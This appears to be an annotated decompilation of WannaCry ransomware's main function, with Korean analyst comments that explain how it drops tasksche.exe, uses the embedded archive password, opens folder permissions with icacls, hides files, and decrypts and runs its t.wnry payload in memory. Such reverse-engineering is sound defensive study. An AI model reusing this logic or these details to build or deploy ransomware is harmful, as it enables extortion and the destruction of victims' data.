// --- Metadata ---
// Function Name: _WinMain@16
// Address: 0x401FE7
// Exported At: 20250520_114625
// Signature: unknown_signature
// ---------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  char ***v4; // eax
  void *decodedTwnryFile; // eax
  _DWORD *decodedTwnryBaseAddr; // eax
  void (__stdcall *v7)(_DWORD, _DWORD); // eax
  void *RSAKeyStruct[310]; // [esp+10h] [ebp-6E4h] BYREF
  CHAR Filename; // [esp+4E8h] [ebp-20Ch] BYREF
  char Filename_1[516]; // [esp+4E9h] [ebp-20Bh] BYREF
  __int16 v12; // [esp+6EDh] [ebp-7h]
  char v13; // [esp+6EFh] [ebp-5h]
  int decodedTwnrySize; // [esp+6F0h] [ebp-4h] BYREF

  Filename = FILENAME;
  memset(Filename_1, 0, sizeof(Filename_1));
  v12 = 0;
  v13 = 0;
  GetModuleFileNameA(0, &Filename, 520u);
  generateRandomNum_401225(DisplayName);        // 난수 생성 
  if ( *_p___argc() != 2
    || (v4 = _p___argv(), strcmp((*v4)[1], "/i"))
    || !saveDataInSystemDir_401B5F(0)           // ProgramData > Intel > Temp 중 성공하는 경로에 임시 파일 생성
    || (CopyFileA(&Filename, "tasksche.exe", 0), GetFileAttributesA("tasksche.exe") == -1)
    || !runTasksche_401F5D() )                  // Tasksche 실행 함수 
  {
    if ( strrchr(&Filename, 92) )
      *strrchr(&Filename, 92) = 0;
    SetCurrentDirectoryA(&Filename);
    manageRegDir_4010FD(1);
    dropper_401DAB(0, "WNcry@2ol7");
    showBitcoinAddress_401E9E();
    ExecuteProcessWithTimeout("attrib +h .", 0, 0);// 첫번째 인자 프로세스 실행 
    ExecuteProcessWithTimeout("icacls . /grant Everyone:F /T /C /Q", 0, 0);
    if ( loadWindowsAPI_40170A() )              // Windows API 호출 
    {
      RSAKey_struct_4012FD(RSAKeyStruct);       // RSA키 저장 구조체 
      if ( RSAKey_constructor_401437(RSAKeyStruct, 0, 0, 0) )// 외부 파일에서 RSA키를 가져옴 
      {
        decodedTwnrySize = 0;
        decodedTwnryFile = decryptWannaCrytFiles_4014A6(RSAKeyStruct, "t.wnry", &decodedTwnrySize);// AES로 암호화된 t.wnry파일을 복호화 
        if ( decodedTwnryFile )
        {
          decodedTwnryBaseAddr = LoadAndExecute_TwnryPayload_4021BD(decodedTwnryFile, decodedTwnrySize);// 복호화된 t.wnry파일을 메모리 상에서 실행 
          if ( decodedTwnryBaseAddr )
          {
            v7 = lookupPEexportTable_402924(decodedTwnryBaseAddr, "TaskStart");// PE 파일의 Export Table에서 특정 함수의 주소를 수동으로 계산 
            if ( v7 )
              v7(0, 0);
          }
        }
      }
      AESKeyStruct_FinalCleanup_40137A(RSAKeyStruct);
    }
  }
  return 0;
}
